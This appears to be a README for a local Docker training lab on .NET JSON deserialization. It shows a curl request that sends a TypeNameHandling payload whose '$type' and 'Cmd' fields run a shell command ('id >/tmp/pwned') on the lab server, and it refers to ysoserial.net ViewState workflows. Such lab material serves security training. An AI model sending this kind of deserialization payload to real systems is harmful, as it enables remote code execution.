# .NET JSON Deserialization Lab (Docker)

Linux-friendly stand-in for ViewState labs (ysoserial.net ViewState still prefers Windows).

```bash
./labctl.sh up dotnet-json
```

- URL: http://127.0.0.1:8113/
- POST `/api/parse` with TypeNameHandling JSON:

```bash
curl -X POST http://127.0.0.1:8113/api/parse \
  -H 'Content-Type: application/json' \
  -d '{"$type":"OsweLab.EvilCommand, DotNetLab","Cmd":"id >/tmp/pwned"}'
```

For real ViewState + machineKey, use a Windows VM + Notes.md ysoserial.net workflow.
